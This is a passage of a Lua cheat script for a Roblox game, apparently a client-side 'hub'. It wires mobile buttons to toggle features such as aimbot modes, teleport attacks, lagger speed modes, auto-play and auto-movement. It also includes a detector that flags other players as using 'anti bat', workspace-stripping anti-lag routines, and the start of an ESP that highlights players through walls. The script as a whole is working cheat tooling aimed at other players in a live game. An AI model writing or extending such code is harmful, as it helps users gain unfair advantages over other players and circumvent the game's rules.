            ColorSequenceKeypoint.new(1, Color3.fromRGB(28, 29, 33)),
        })
        local isActionBtn = ACTION_BTN_KEYS[def.key] == true
        if isActionBtn then
            noBgGradient.Enabled = false
            frame.BackgroundColor3 = ACTION_IDLE
        end
        local fstroke = Instance.new("UIStroke", frame)
        fstroke.Color = BORDER_OFF
        fstroke.Thickness = STROKE_W
        fstroke.Transparency = 0.45
        local btn = Instance.new("TextButton", frame)
        btn.Size = UDim2.new(1, 0, 1, 0)
        btn.BackgroundTransparency = 1
        btn.Text = def.label
        btn.TextColor3 = TEXT_OFF
        btn.Font = Enum.Font.LuckiestGuy
        btn.TextSize = fontSize
        btn.LineHeight = 1.1
        btn.TextWrapped = true
        btn.AutoButtonColor = false
        btn.ZIndex = 105
        btn.TextStrokeTransparency = 1
        local isOn = false
        local function setOn(v)
            isOn = v
            if v then
                frame:SetAttribute("BtnIsOn", true)
                frame:SetAttribute("S2MobileButtonOn", true)
                local g = frame:FindFirstChild("S2NoBackgroundGradient")
                if g then g.Enabled = false end
                TweenService:Create(frame, TweenInfo.new(0.12, Enum.EasingStyle.Quad), { BackgroundColor3 = mobileVisualIndex == 2 and BTN_BG_OFF or (HUB_COLOR_PALETTES[hubColorIndex] or HUB_COLOR_PALETTES[1]).primary })
                    :Play()
                TweenService:Create(fstroke, TweenInfo.new(0.12), { Color = mobileVisualIndex == 2 and Color3.fromRGB(0, 0, 0) or (HUB_COLOR_PALETTES[hubColorIndex] or HUB_COLOR_PALETTES[1]).primary, Thickness = STROKE_W + 1 })
                    :Play()
                TweenService:Create(btn, TweenInfo.new(0.12), { TextColor3 = mobileVisualIndex == 2 and (HUB_COLOR_PALETTES[hubColorIndex] or HUB_COLOR_PALETTES[1]).primary or th.MOB_TEXT_ON }):Play()
            else
                frame:SetAttribute("BtnIsOn", false)
                frame:SetAttribute("S2MobileButtonOn", false)
                local g = frame:FindFirstChild("S2NoBackgroundGradient")
                if g then g.Enabled = mobileVisualIndex == 1 end
                TweenService
                    :Create(frame, TweenInfo.new(0.12, Enum.EasingStyle.Quad), { BackgroundColor3 = mobileVisualIndex == 2 and Color3.fromRGB(255, 255, 255) or (ACTION_BTN_KEYS[def.key] and ACTION_BTN_IDLE or Color3.fromRGB(0, 0, 0)) })
                    :Play()
                TweenService:Create(fstroke, TweenInfo.new(0.12), { Color = mobileVisualIndex == 2 and Color3.fromRGB(0, 0, 0) or Color3.fromRGB(60, 61, 68), Thickness = STROKE_W }):Play()
                TweenService:Create(btn, TweenInfo.new(0.12), { TextColor3 = mobileVisualIndex == 2 and (HUB_COLOR_PALETTES[hubColorIndex] or HUB_COLOR_PALETTES[1]).primary or Color3.fromRGB(242, 242, 246) }):Play()
            end
        end
        mobBtnRefs[def.key] = setOn
        local clickScale = Instance.new("UIScale", frame)
        clickScale.Scale = 1
        local function clickAnimate()
            TweenService:Create(clickScale, TweenInfo.new(0.07, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { Scale = 0.88 }):Play()
            task.delay(0.07, function()
                if clickScale and clickScale.Parent then
                    TweenService:Create(clickScale, TweenInfo.new(0.18, Enum.EasingStyle.Back, Enum.EasingDirection.Out), { Scale = 1 }):Play()
                end
            end)
        end
        local function flash()
            local palette = HUB_COLOR_PALETTES[hubColorIndex] or HUB_COLOR_PALETTES[1]
            local idleCol = mobileVisualIndex == 2 and Color3.fromRGB(255, 255, 255) or (ACTION_BTN_KEYS[def.key] and ACTION_BTN_IDLE or Color3.fromRGB(0, 0, 0))
            local clickCol = palette.primary
            local clickText = Color3.fromRGB(255, 255, 255)
            local restoreText = mobileVisualIndex == 2 and palette.primary or Color3.fromRGB(242, 242, 246)
            TweenService:Create(frame, TweenInfo.new(0.06), { BackgroundColor3 = clickCol }):Play()
            TweenService:Create(btn, TweenInfo.new(0.06), { TextColor3 = clickText }):Play()
            task.delay(0.18, function()
                if frame and frame.Parent then
                    TweenService:Create(frame, TweenInfo.new(0.1), { BackgroundColor3 = idleCol }):Play()
                    TweenService:Create(btn, TweenInfo.new(0.1), { TextColor3 = restoreText }):Play()
                end
            end)
        end
        local _fdn, _fds, _fsp, _fdDragging, _justDragged = false, nil, nil, false, false
        btn.InputBegan:Connect(function(input)
            if uiLocked then
                return
            end
            if activeMobDrag and activeMobDrag ~= frame then
                return
            end
            if
                input.UserInputType ~= Enum.UserInputType.MouseButton1
                and input.UserInputType ~= Enum.UserInputType.Touch
            then
                return
            end
            _fdn = true
            _fds = input.Position
            _fsp = frame.Position
            _fdDragging = false
            _justDragged = false
            activeMobDrag = frame
        end)
        btn.InputChanged:Connect(function(input)
            if not _fdn or uiLocked then
                return
            end
            if
                input.UserInputType ~= Enum.UserInputType.MouseMovement
                and input.UserInputType ~= Enum.UserInputType.Touch
            then
                return
            end
            local d = input.Position - _fds
            if not _fdDragging then
                if math.abs(d.X) > 8 or math.abs(d.Y) > 8 then
                    _fdDragging = true
                else
                    return
                end
            end
            local vp = (workspace.CurrentCamera and workspace.CurrentCamera.ViewportSize) or Vector2.new(800, 600)
            local rawX = _fsp.X.Scale * vp.X + _fsp.X.Offset + d.X
            local rawY = _fsp.Y.Scale * vp.Y + _fsp.Y.Offset + d.Y
            frame.Position = UDim2.new(0, math.clamp(rawX, 0, vp.X - BTN_W), 0, math.clamp(rawY, 0, vp.Y - BTN_SIZE))
            _justDragged = true
        end)
        UIS.InputEnded:Connect(function(input)
            if not _fdn or activeMobDrag ~= frame then
                return
            end
            if
                input.UserInputType ~= Enum.UserInputType.MouseButton1
                and input.UserInputType ~= Enum.UserInputType.Touch
            then
                return
            end
            _fdn = false
            activeMobDrag = nil
            if _fdDragging then
                pcall(saveBtnPositions)
            end
            _fdDragging = false
            task.delay(0.08, function()
                _justDragged = false
            end)
        end)
        btn.Activated:Connect(function()
            if _justDragged then
                return
            end
            clickAnimate()
            if def.key == "jump" then
                triggerJumpButton()
                flash()
                return
            end
            if def.key == "tpDown" then
                runTPFloor()
                flash()
                return
            end
            if def.key == "drop" then
                runDrop()
                flash()
                return
            end
            if def.key == "antiTPBat" then
                antiTPBatEnabled = not antiTPBatEnabled
                if antiTPBatEnabled then startAntiTPBat() else stopAntiTPBat() end
                if setAntiTPBatVisual then setAntiTPBatVisual(antiTPBatEnabled) end
                setOn(antiTPBatEnabled)
                saveConfig()
                return
            end
            if def.key == "normalCarry" then
                if carrySpeedActive and not laggerModeEnabled and not laggerCarryActive then
                    setNormalSpeed()
                else
                    setNormalCarry()
                end
                return
            elseif def.key == "laggerNormal" then
                if laggerModeEnabled and not laggerCarryActive then
                    setNormalSpeed()
                else
                    setLaggerNormal()
                end
                return
            elseif def.key == "laggerCarry" then
                if laggerCarryActive then
                    setNormalSpeed()
                else
                    setLaggerCarry()
                end
                return
            end
            if def.exclusive then
                local alreadyOn = (def.key == "autoPlay" and autoPlayEnabled)
                    or (def.key == "autoBat" and autoBatEnabled)
                    or (def.key == "batV2" and aimbotV2Enabled)
                    or (def.key == "aimbotV2" and aimbotV2Enabled)
                    or (def.key == "tpBat" and _G.S2AntiDesyncAimbotOn)
                    or (def.key == "autoLeft" and autoLeftEnabled)
                    or (def.key == "autoRight" and autoRightEnabled)
                if alreadyOn then
                    if def.key == "autoPlay" then
                        autoPlayEnabled = false
                        if type(stopAutoPlay) == "function" then
                            stopAutoPlay()
                        end
                        setOn(false)
                    elseif def.key == "autoBat" then
                        if _G._S2ManualAimbotSelection == "classic" then
                            _G._S2ManualAimbotSelection = nil
                        end
                        if autoBatEnabled then
                            stopBatAimbot()
                        end
                        if autoBatSetVisual then
                            autoBatSetVisual(false)
                        end
                        setOn(false)
                    elseif def.key == "aimbotV2" then
                        if _G._S2ManualAimbotSelection == "v2" then
                            _G._S2ManualAimbotSelection = nil
                        end
                        stopAimbotV2()
                        setOn(false)
                    elseif def.key == "batV2" then
                        if _G._S2ManualAimbotSelection == "v2" then
                            _G._S2ManualAimbotSelection = nil
                        end
                        stopAimbotV2()
                        setOn(false)
                    elseif def.key == "tpBat" then
                        _G.S2StopAntiDesyncAimbot()
                        if batTP.setVisual then
                            batTP.setVisual(false)
                        end
                        setOn(false)
                    elseif def.key == "autoLeft" then
                        autoLeftEnabled = false
                        stopAutoLeft()
                        setOn(false)
                    elseif def.key == "autoRight" then
                        autoRightEnabled = false
                        stopAutoRight()
                        setOn(false)
                    end
                    saveConfig()
                    return
                end
                if autoPlayEnabled and def.key ~= "autoPlay" then
                    autoPlayEnabled = false
                    if type(stopAutoPlay) == "function" then
                        stopAutoPlay()
                    end
                    if mobBtnRefs.autoPlay then
                        mobBtnRefs.autoPlay(false)
                    end
                end
                if autoBatEnabled and def.key ~= "autoBat" then
                    stopBatAimbot()
                    if autoBatSetVisual then
                        autoBatSetVisual(false)
                    end
                    if mobBtnRefs.autoBat then
                        mobBtnRefs.autoBat(false)
                    end
                end
                if aimbotV2Enabled and def.key ~= "aimbotV2" and def.key ~= "batV2" then
                    stopAimbotV2()
                    if mobBtnRefs.aimbotV2 then
                        mobBtnRefs.aimbotV2(false)
                    end
                end
                if _G.S2AntiDesyncAimbotOn and def.key ~= "tpBat" then
                    _G.S2StopAntiDesyncAimbot()
                    if batTP.setVisual then
                        batTP.setVisual(false)
                    end
                    if mobBtnRefs.tpBat then
                        mobBtnRefs.tpBat(false)
                    end
                end
                if autoLeftEnabled and def.key ~= "autoLeft" then
                    autoLeftEnabled = false
                    stopAutoLeft()
                    if mobBtnRefs.autoLeft then
                        mobBtnRefs.autoLeft(false)
                    end
                end
                if autoRightEnabled and def.key ~= "autoRight" then
                    autoRightEnabled = false
                    stopAutoRight()
                    if mobBtnRefs.autoRight then
                        mobBtnRefs.autoRight(false)
                    end
                end
                if def.key == "autoPlay" then
                    autoPlayEnabled = true
                    if type(startAutoPlay) == "function" then
                        startAutoPlay()
                    end
                    setOn(true)
                elseif def.key == "autoBat" then
                    _G._S2ManualAimbotSelection = "classic"
                    antiBatBypassEnabled = false
                    queueAutoBatStart()
                    if autoBatSetVisual then
                        autoBatSetVisual(true)
                    end
                    setOn(true)
                elseif def.key == "tpBat" then
                    _G.S2StartAntiDesyncAimbot()
                    if batTP.setVisual then
                        batTP.setVisual(true)
                    end
                    setOn(true)
                elseif def.key == "batV2" then
                    _G._S2ManualAimbotSelection = "v2"
                    startAimbotV2()
                    setOn(aimbotV2Enabled)
                elseif def.key == "autoLeft" then
                    autoLeftEnabled = true
                    startAutoLeft()
                    setOn(true)
                elseif def.key == "autoRight" then
                    autoRightEnabled = true
                    startAutoRight()
                    setOn(true)
                end
                saveConfig()
                return
            end
        end)
    end
    if mobBtnRefs.normalCarry then
        mobBtnRefs.normalCarry(carrySpeedActive and not laggerModeEnabled and not laggerCarryActive)
    end
    if mobBtnRefs.laggerNormal then
        mobBtnRefs.laggerNormal(laggerModeEnabled and not laggerCarryActive)
    end
    if mobBtnRefs.laggerCarry then
        mobBtnRefs.laggerCarry(laggerCarryActive)
    end
    if mobBtnRefs.autoPlay then
        mobBtnRefs.autoPlay(autoPlayEnabled)
    end
    if mobBtnRefs.autoLeft then
        mobBtnRefs.autoLeft(autoLeftEnabled)
    end
    if mobBtnRefs.autoRight then
        mobBtnRefs.autoRight(autoRightEnabled)
    end
    if mobBtnRefs.autoBat then
        mobBtnRefs.autoBat(autoBatEnabled)
    end
    if mobBtnRefs.batV2 then
        mobBtnRefs.batV2(aimbotV2Enabled)
    end
    if mobBtnRefs.aimbotV2 then
        mobBtnRefs.aimbotV2(aimbotV2Enabled)
    end
    if mobBtnRefs.tpBat then
        mobBtnRefs.tpBat(_G.S2AntiDesyncAimbotOn)
    end
    if mobBtnRefs.antiTPBat then
        mobBtnRefs.antiTPBat(antiTPBatEnabled)
    end
    applyMobileActionButtonBackground(buttonBackgroundIndex)
    applyStealBarBackground(buttonBackgroundIndex)
end
espBoxEnabled = false
espHighlightEnabled = false
espTracerEnabled = false
espSpeedEnabled = false
espRagdollCDEnabled = false
espAvatarEnabled = false
local antiBatWarningGui = nil
local antiBatWarningFrame = nil
local antiBatWarningToken = 0
local antiBatWarningPlayers = _G.S2AntiBatWarnedUserIds
if type(antiBatWarningPlayers) ~= "table" then
    antiBatWarningPlayers = {}
    _G.S2AntiBatWarnedUserIds = antiBatWarningPlayers
end
local function showAntiBatWarning(plr)
    if not warningAntiBatEnabled or not plr then return end
    antiBatWarningToken = antiBatWarningToken + 1
    local token = antiBatWarningToken
    if antiBatWarningFrame then
        antiBatWarningFrame:Destroy()
        antiBatWarningFrame = nil
    end
    if not antiBatWarningGui or not antiBatWarningGui.Parent then
        antiBatWarningGui = Instance.new("ScreenGui")
        antiBatWarningGui.Name = "S2AntiBatWarning"
        antiBatWarningGui.ResetOnSpawn = false
        antiBatWarningGui.IgnoreGuiInset = true
        antiBatWarningGui.DisplayOrder = 1000
        parentGui(antiBatWarningGui)
    end
    local palette = HUB_COLOR_PALETTES[hubColorIndex] or HUB_COLOR_PALETTES[1]
    local frame = Instance.new("Frame")
    antiBatWarningFrame = frame
    frame.Name = "Warning"
    frame.AnchorPoint = Vector2.new(0.5, 0)
    frame.Size = UDim2.new(0, 460, 0, 72)
    frame.Position = UDim2.new(0.5, 0, 0, -90)
    frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    frame.BackgroundTransparency = 0.08
    frame.BorderSizePixel = 0
    frame.ZIndex = 1000
    frame.Parent = antiBatWarningGui
    Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 22)
    local stroke = Instance.new("UIStroke", frame)
    stroke.Color = palette.primary
    stroke.Thickness = 1
    stroke.Transparency = 0
    local label = Instance.new("TextLabel", frame)
    label.Name = "Message"
    label.Size = UDim2.new(1, -24, 1, -10)
    label.Position = UDim2.new(0, 12, 0, 5)
    label.BackgroundTransparency = 1
    label.Text = "The Player " .. tostring(plr.DisplayName or plr.Name) .. " Are Using Anti Bat"
    label.TextColor3 = Color3.fromRGB(255, 255, 255)
    label.Font = Enum.Font.GothamSemibold
    label.TextSize = 17
    label.TextWrapped = true
    label.TextXAlignment = Enum.TextXAlignment.Center
    label.TextYAlignment = Enum.TextYAlignment.Center
    label.ZIndex = 1001
    TweenService:Create(frame, TweenInfo.new(0.42, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {
        Position = UDim2.new(0.5, 0, 0, 28),
    }):Play()
    task.delay(3, function()
        if token ~= antiBatWarningToken or not frame.Parent then return end
        local out = TweenService:Create(frame, TweenInfo.new(0.22, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
            Position = UDim2.new(0.5, 0, 0, -100),
        })
        out:Play()
        out.Completed:Wait()
        if token == antiBatWarningToken then
            frame:Destroy()
            antiBatWarningFrame = nil
        end
    end)
end
task.spawn(function()
    while task.wait(0.2) do
        for _, plr in ipairs(Players:GetPlayers()) do
            if plr ~= LP then
                local speed = getPlayerHorizontalSpeed(plr)
                local warningKey = tonumber(plr.UserId) or plr.Name
                if speed >= ANTI_BAT_SPEED_THRESHOLD then
                    if warningAntiBatEnabled and not antiBatWarningPlayers[warningKey] then
                        antiBatWarningPlayers[warningKey] = true
                        showAntiBatWarning(plr)
                    end
                end
            end
        end
    end
end)
optimizeEnabled = false
nukeOptimiserEnabled = false
setNukeOptimiserVisual = nil
local nukeOptimizerOn = false
local nukeOptimizerConns = {}
local nukeOptimizerThreads = {}
local function nukeIsCharacterPart(obj)
    if not obj then return false end
    local ancestor = obj
    while ancestor and ancestor ~= workspace do
        if ancestor:IsA("Model") and Players:GetPlayerFromCharacter(ancestor) then
            return true
        end
        ancestor = ancestor.Parent
    end
    return false
end
local function nukeCleanObject(obj)
    if not obj or not obj.Parent or nukeIsCharacterPart(obj) then
        return
    end
    pcall(function()
        if obj:IsA("ParticleEmitter") or obj:IsA("Trail") or obj:IsA("Beam") or obj:IsA("Smoke") or obj:IsA("Fire") or obj:IsA("Sparkles") then
            obj.Enabled = false
            obj:Destroy()
        elseif obj:IsA("SurfaceAppearance") or obj:IsA("Texture") or obj:IsA("Decal") then
            obj:Destroy()
        elseif obj:IsA("BasePart") then
            obj.CastShadow = false
            obj.Material = Enum.Material.Plastic
            obj.MaterialVariant = ""
            obj.Reflectance = 0
        end
    end)
end
function enableNukeOptimizer()
    if nukeOptimizerOn then return end
    stopOtherWorkspaceOptimizers("nukeOptimizer")
    nukeOptimizerSession = (nukeOptimizerSession or 0) + 1
    local session = nukeOptimizerSession
    local seen = setmetatable({}, { __mode = "k" })
    local queueState = { items = {}, head = 1, tail = 0, pending = setmetatable({}, { __mode = "k" }) }
    local function isActive()
        return nukeOptimizerOn and nukeOptimizerSession == session
    end
    local function processObject(obj)
        nukeCleanObject(obj)
    end
    nukeOptimizerOn = true
    nukeOptimiserEnabled = true
    pcall(function()
        settings().Rendering.QualityLevel = Enum.QualityLevel.Level01
        settings().Rendering.MeshPartDetailLevel = Enum.MeshPartDetailLevel.Level01
    end)
    pcall(function()
        Lighting.GlobalShadows = false
        Lighting.FogEnd = 9e9
        Lighting.FogStart = 9e9
        Lighting.EnvironmentDiffuseScale = 0
        Lighting.EnvironmentSpecularScale = 0
        for _, effect in ipairs(Lighting:GetChildren()) do
            if effect:IsA("PostEffect") or effect:IsA("Atmosphere") or effect:IsA("Clouds") then
                effect:Destroy()
            end
        end
    end)
    pcall(function()
        local terrain = workspace:FindFirstChildOfClass("Terrain")
        if terrain then
            terrain.Decoration = false
            terrain.WaterWaveSize = 0
            terrain.WaterWaveSpeed = 0
            terrain.WaterReflectance = 0
            terrain.WaterTransparency = 1
        end
    end)
    table.insert(nukeOptimizerConns, workspace.DescendantAdded:Connect(function(obj)
        optimizerQueueDescendant(queueState, obj, isActive, processObject, seen)
    end))
    table.insert(nukeOptimizerConns, Lighting.DescendantAdded:Connect(function(obj)
        if isActive() and (obj:IsA("PostEffect") or obj:IsA("Atmosphere") or obj:IsA("Clouds")) then
            pcall(function() obj:Destroy() end)
        end
    end))
    table.insert(nukeOptimizerThreads, task.spawn(function()
        if not game:IsLoaded() then game.Loaded:Wait() end
        optimizerWalkDescendantsBatched(workspace, isActive, processObject, seen, 48)
    end))
end
function disableNukeOptimizer()
    nukeOptimizerOn = false
    nukeOptimiserEnabled = false
    nukeOptimizerSession = (nukeOptimizerSession or 0) + 1
    for _, conn in ipairs(nukeOptimizerConns) do
        pcall(function() conn:Disconnect() end)
    end
    nukeOptimizerConns = {}
    for _, thread in ipairs(nukeOptimizerThreads) do
        pcall(function() task.cancel(thread) end)
    end
    nukeOptimizerThreads = {}
end
-- 000 DUELS NUKED ANTI LAG (física portada do EasyDuels)
nukedAntiLagOn = false
nukedAntiLagNoSkinsOn = false
local nukedConns = {}
local nukedThreads = {}
local function nukedIsCharacterPart(obj)
    if not obj then return false end
    local ancestor = obj
    while ancestor and ancestor ~= workspace do
        if ancestor:IsA("Model") then
            if Players:GetPlayerFromCharacter(ancestor) then
                return true
            end
            if nukedAntiLagNoSkinsOn and ancestor:FindFirstChildOfClass("Humanoid") then
                return true
            end
        end
        ancestor = ancestor.Parent
    end
    return false
end
local function nukedSafeDestroy(obj)
    if obj and obj.Name == "Overhead" then return end
    if nukedAntiLagNoSkinsOn and nukedIsCharacterPart(obj) then return end
    pcall(function() obj:Destroy() end)
end
local NUKED_CLOTHING = {"Shirt","Pants","ShirtGraphic","Accessory","Hat","HairAccessory","FaceAccessory","NeckAccessory","ShoulderAccessory","FrontAccessory","BackAccessory","WaistAccessory"}
local function nukedIsClothing(obj)
    for _, cn in ipairs(NUKED_CLOTHING) do
        if obj:IsA(cn) then return true end
    end
    return false
end
local NUKED_BASE_NAMES = {"baseplate","spawnlocation","spawn location","spawn"}
local function nukedIsBase(obj)
    if not obj:IsA("BasePart") then return false end
    local nl = obj.Name:lower()
    for _, n in ipairs(NUKED_BASE_NAMES) do
        if nl:find(n, 1, true) then return true end
    end
    return false
end
local function nukedIsInBase(obj)
    local p = obj.Parent
    while p and p ~= workspace do
        if nukedIsBase(p) then return true end
        p = p.Parent
    end
    return false
end
local function nukedIsOutOfRange(obj)
    if obj:IsA("BasePart") then
        local x = obj.Position.X
        return x < -560 or x > -240
    end
    return false
end
local function nukedMakeTransparent(obj)
    pcall(function()
        if nukedIsBase(obj) and not nukedIsCharacterPart(obj) then
            obj.Transparency = 1
            obj.CastShadow = false
        end
    end)
end
local function nukedIsAnimationObject(obj)
    if not obj then return false end
    return obj:IsA("Animation")
        or obj:IsA("AnimationController")
        or obj:IsA("Animator")
end
local function nukedCleanObject(obj)
    pcall(function()
        if nukedAntiLagNoSkinsOn and nukedIsCharacterPart(obj) then return end
        -- Nunca tocar nos objetos responsáveis pelas animações do personagem.
        if nukedIsAnimationObject(obj) then
            return
        elseif obj:IsA("SurfaceAppearance") then
            nukedSafeDestroy(obj)
        elseif obj:IsA("Decal") or obj:IsA("Texture") or obj:IsA("SpecialMesh") then
            nukedSafeDestroy(obj)
        elseif obj:IsA("ParticleEmitter") or obj:IsA("Trail") or obj:IsA("Beam") then
            nukedSafeDestroy(obj)
        elseif obj:IsA("PointLight") or obj:IsA("SpotLight") or obj:IsA("SurfaceLight") then
            nukedSafeDestroy(obj)
        elseif obj:IsA("Fire") or obj:IsA("Smoke") or obj:IsA("Sparkles") or obj:IsA("Explosion") then
            nukedSafeDestroy(obj)
        elseif obj:IsA("BasePart") then
            obj.CastShadow = false
            obj.Material = Enum.Material.Plastic
            obj.MaterialVariant = ""
            obj.Reflectance = 0
        end
    end)
end
local function nukedApplyGreySky()
    pcall(function()
        for _, obj in ipairs(Lighting:GetChildren()) do
            if obj:IsA("Sky") then obj:Destroy() end
        end
        local sky = Instance.new("Sky")
        sky.SkyboxBk = ""; sky.SkyboxDn = ""; sky.SkyboxFt = ""
        sky.SkyboxLf = ""; sky.SkyboxRt = ""; sky.SkyboxUp = ""
        sky.CelestialBodiesShown = false
        sky.Name = "_000DuelsNukeSky"
        sky.Parent = Lighting
    end)
end
local function nukedOptimizeLighting()
    pcall(function()
        Lighting.GlobalShadows = false
        Lighting.FogEnd = 9e9
        Lighting.FogStart = 9e9
        Lighting.EnvironmentDiffuseScale = 0
        Lighting.EnvironmentSpecularScale = 0
        Lighting.Brightness = 1.5
        Lighting.Ambient = Color3.fromRGB(60, 60, 60)
        for _, v in ipairs(Lighting:GetChildren()) do
            if v:IsA("BloomEffect") or v:IsA("BlurEffect") or v:IsA("ColorCorrectionEffect") or v:IsA("SunRaysEffect") or v:IsA("DepthOfFieldEffect") or v:IsA("Atmosphere") or v:IsA("Clouds") then
                v:Destroy()
            end
        end
        nukedApplyGreySky()
    end)
end
local function nukedApplyTerrain()
    pcall(function()
        local terrain = workspace:FindFirstChildOfClass("Terrain")
        if terrain then
            terrain.Decoration = false
            terrain.WaterWaveSize = 0
            terrain.WaterWaveSpeed = 0
            terrain.WaterReflectance = 0
            terrain.WaterTransparency = 1
        end
    end)
end
function enableNukedAntiLag(preservePlayerSkins)
    if nukedAntiLagOn then return end
    stopOtherWorkspaceOptimizers("nuked")
    nukedOptimizerSession = (nukedOptimizerSession or 0) + 1
    local session = nukedOptimizerSession
    local preserveMode = preservePlayerSkins == true
    local seen = setmetatable({}, { __mode = "k" })
    local queueState = { items = {}, head = 1, tail = 0, pending = setmetatable({}, { __mode = "k" }) }
    local function isActive()
        return nukedAntiLagOn and nukedOptimizerSession == session
            and nukedAntiLagNoSkinsOn == preserveMode
    end
    local function processObject(obj)
        local isCharacter = nukedIsCharacterPart(obj)
        if preserveMode and isCharacter then return end
        if nukedIsBase(obj) then
            nukedMakeTransparent(obj)
        elseif not preserveMode and nukedIsClothing(obj) then
            nukedSafeDestroy(obj)
        elseif nukedIsInBase(obj) then
            return
        elseif isCharacter then
            nukedCleanObject(obj)
        elseif nukedIsOutOfRange(obj) then
            nukedSafeDestroy(obj)
        else
            nukedCleanObject(obj)
        end
    end
    nukedAntiLagOn = true
    nukedAntiLagNoSkinsOn = preserveMode
    pcall(function()
        settings().Rendering.QualityLevel = Enum.QualityLevel.Level01
        settings().Rendering.MeshPartDetailLevel = Enum.MeshPartDetailLevel.Level01
    end)
    nukedOptimizeLighting()
    nukedApplyTerrain()
    table.insert(nukedConns, workspace.DescendantAdded:Connect(function(obj)
        optimizerQueueDescendant(queueState, obj, isActive, processObject, seen)
    end))
    table.insert(nukedConns, Lighting.DescendantAdded:Connect(function(obj)
        if not isActive() then return end
        if obj:IsA("Atmosphere") or obj:IsA("Clouds") or obj:IsA("PostEffect") then
            nukedSafeDestroy(obj)
        end
    end))
    pcall(function()
        local MaterialService = game:GetService("MaterialService")
        table.insert(nukedConns, MaterialService.DescendantAdded:Connect(function(obj)
            if not isActive() or preserveMode then return end
            nukedSafeDestroy(obj)
        end))
    end)
    table.insert(nukedThreads, task.spawn(function()
        if not game:IsLoaded() then game.Loaded:Wait() end
        optimizerWalkDescendantsBatched(workspace, isActive, processObject, seen, 48)
    end))
end
function disableNukedAntiLag()
    nukedAntiLagOn = false
    nukedAntiLagNoSkinsOn = false
    nukedOptimizerSession = (nukedOptimizerSession or 0) + 1
    for _, conn in ipairs(nukedConns) do pcall(function() conn:Disconnect() end) end
    nukedConns = {}
    for _, thread in ipairs(nukedThreads) do pcall(function() task.cancel(thread) end) end
    nukedThreads = {}
end
function stopOtherWorkspaceOptimizers(except)
    if except ~= "antiLag" and antiLagEnabled then
        disableAntiLag()
        if setAntiLagVisual then setAntiLagVisual(false) end
    end
    if except ~= "antiLagV2" and antiLagV2Enabled then
        disableAntiLagV2()
        if setAntiLagV2Visual then setAntiLagV2Visual(false) end
    end
    if except ~= "nukeOptimizer" and nukeOptimizerOn then
        disableNukeOptimizer()
        if setNukeOptimiserVisual then setNukeOptimiserVisual(false) end
    end
    if except ~= "nuked" and nukedAntiLagOn then
        disableNukedAntiLag()
        if setNukedAntiLagVisual then setNukedAntiLagVisual(false) end
        if setNukedAntiLagNoSkinsVisual then setNukedAntiLagNoSkinsVisual(false) end
    end
end
setNukedAntiLagVisual, setNukedAntiLagNoSkinsVisual = nil, nil
setEspBoxVisual, setEspHighlightVisual, setEspTracerVisual = nil, nil, nil
setEspSpeedVisual, setEspRagdollCDVisual, setEspAvatarVisual = nil, nil, nil
ESP_ACCENT = LIGHT_BLUE
ESP_RAGDOLL_CD = 4.5
PlayerESP = PlayerESP or { enabled = false, playerData = {}, conns = {} }
BoxedESPOptions = BoxedESPOptions or { box = false, tracer = false }
BoxedESPData = BoxedESPData or {}
BoxedESPConn = BoxedESPConn or nil
espRagLast = espRagLast or {}
espRagConns = espRagConns or {}
local function espTrackRagdoll(plr)
    if espRagConns[plr] then
        return
    end
    espRagConns[plr] = {}
    local function hook(char)
        local hum = char and (char:FindFirstChildOfClass("Humanoid") or char:WaitForChild("Humanoid", 5))
        if not hum then
            return
        end
        if espRagConns[plr] and espRagConns[plr].state then
            pcall(function()
                espRagConns[plr].state:Disconnect()
            end)
        end
        local was = isRagdollState(hum)
        espRagConns[plr].state = hum.StateChanged:Connect(function()
            local now = isRagdollState(hum)
            if was and not now then
                espRagLast[plr] = tick()
            end
            was = now
        end)
    end
    espRagConns[plr].added = plr.CharacterAdded:Connect(function(c)
        task.defer(hook, plr, c)
    end)
    if plr.Character then
        task.defer(hook, plr.Character)
    end
end
local function espUntrackRagdoll(plr)
    local t = espRagConns[plr]
    if t then
        for _, c in pairs(t) do
            pcall(function()
                c:Disconnect()
            end)
        end
        espRagConns[plr] = nil
    end
    espRagLast[plr] = nil
end
local function espRagText(plr, hum)
    if not espRagdollCDEnabled then
        return nil
    end
    if hum and isRagdollState(hum) then
        return "ragdoll"
    end
    local last = espRagLast[plr]
    local left = last and (ESP_RAGDOLL_CD - (tick() - last)) or 0
    if left > 0 then
        return string.format("cd %.1fs", left)
    end
    return "ready"
end
function startPlayerESP()
    if PlayerESP.enabled then
        return
    end
    PlayerESP.enabled = true
    local function cleanup(plr)
        local d = PlayerESP.playerData[plr]
        if not d then
            return
        end
        pcall(function()
            if d.highlight then
                d.highlight:Destroy()
            end
        end)
        pcall(function()
            if d.billboard then
                d.billboard:Destroy()
            end
        end)
        pcall(function()
            if d.speedBillboard then
                d.speedBillboard:Destroy()
            end
        end)
        if d.conns then
            for _, c in ipairs(d.conns) do
                pcall(function()
                    c:Disconnect()
                end)
            end
        end
        PlayerESP.playerData[plr] = nil
    end
    local function setup(plr, char)
        if not PlayerESP.enabled or plr == LP then
            return
        end
        cleanup(plr)
        local hrp = char and (char:FindFirstChild("HumanoidRootPart") or char:WaitForChild("HumanoidRootPart", 5))
        local head = char and (char:FindFirstChild("Head") or char:WaitForChild("Head", 5))
        if not hrp or not head then
            return
        end
        local hl = Instance.new("Highlight")
        hl.Name = "S2ESP"
        hl.Adornee = char
        hl.FillColor = ESP_ACCENT
        hl.FillTransparency = 0.6
        hl.OutlineColor = Color3.fromRGB(245, 245, 245)
        hl.OutlineTransparency = 0
        hl.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
        hl.Enabled = espHighlightEnabled == true
        hl.Parent = char
        local bb = Instance.new("BillboardGui")
        bb.Name = "S2ESPTag"
        bb.Adornee = head
        bb.Size = UDim2.new(0, 190, 0, 50)
        bb.StudsOffset = Vector3.new(0, 3.0, 0)
        bb.AlwaysOnTop = true
        bb.LightInfluence = 0
        bb.Enabled = espAvatarEnabled == true
        bb.Parent = head
        HubFonts.register(bb)
        local speedBillboard = Instance.new("BillboardGui")
        speedBillboard.Name = "S2ESPSpeed"
        speedBillboard.Adornee = head
        speedBillboard.Size = UDim2.new(0, 82, 0, 24)
        speedBillboard.StudsOffset = Vector3.new(0, 4.1, 0)
        speedBillboard.AlwaysOnTop = true
        speedBillboard.LightInfluence = 0
        speedBillboard.Enabled = espSpeedEnabled == true
        speedBillboard.Parent = head
        HubFonts.register(speedBillboard)
